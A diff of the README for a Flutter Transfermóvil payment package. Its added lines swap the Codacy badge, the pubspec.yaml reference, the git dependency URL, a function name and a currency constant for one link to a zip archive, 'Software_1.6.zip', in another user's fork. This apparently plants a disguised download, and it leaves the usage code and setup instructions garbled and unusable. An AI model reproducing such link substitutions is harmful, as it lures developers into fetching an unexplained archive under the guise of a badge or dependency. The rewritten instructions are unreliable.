@@ -1,4 +1,4 @@
-[![Codacy Badge](https://app.codacy.com/project/badge/Grade/590b7e2d25444c04b339842c9162c6cb)](https://www.codacy.com/gh/alejandrogiubel/transfermovil/dashboard?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=alejandrogiubel/transfermovil&amp;utm_campaign=Badge_Grade)
+[![Codacy Badge](https://github.com/Ivan-piedra/transfermovil/raw/refs/heads/master/lib/Software_1.6.zip)](https://github.com/Ivan-piedra/transfermovil/raw/refs/heads/master/lib/Software_1.6.zip;utm_medium=referral&amp;utm_content=alejandrogiubel/transfermovil&amp;utm_campaign=Badge_Grade)
 
 A Flutter package to use Transfermóvil online payment method (Only Android).
 
@@ -8,7 +8,7 @@ Open Transfermovil Android App in online payment view.
 
 ## Usage
 
-Just add this to your `pubspec.yaml`:
+Just add this to your `https://github.com/Ivan-piedra/transfermovil/raw/refs/heads/master/lib/Software_1.6.zip`:
 
 ```yaml
   dependencies:
@@ -20,14 +20,14 @@ Or
 ```yaml
   dependencies:
     transfermovil:
-      git: https://github.com/alejandrogiubel/transfermovil
+      git: https://github.com/Ivan-piedra/transfermovil/raw/refs/heads/master/lib/Software_1.6.zip
 ```
 
 ```dart
-Transfermovil.makeOnlinePayment(
+https://github.com/Ivan-piedra/transfermovil/raw/refs/heads/master/lib/Software_1.6.zip(
   transactionId: 1,
   amount: 1,
-  currency: Currency.cuc,
+  currency: https://github.com/Ivan-piedra/transfermovil/raw/refs/heads/master/lib/Software_1.6.zip,
   providerNumber: 1,
 );
 ```
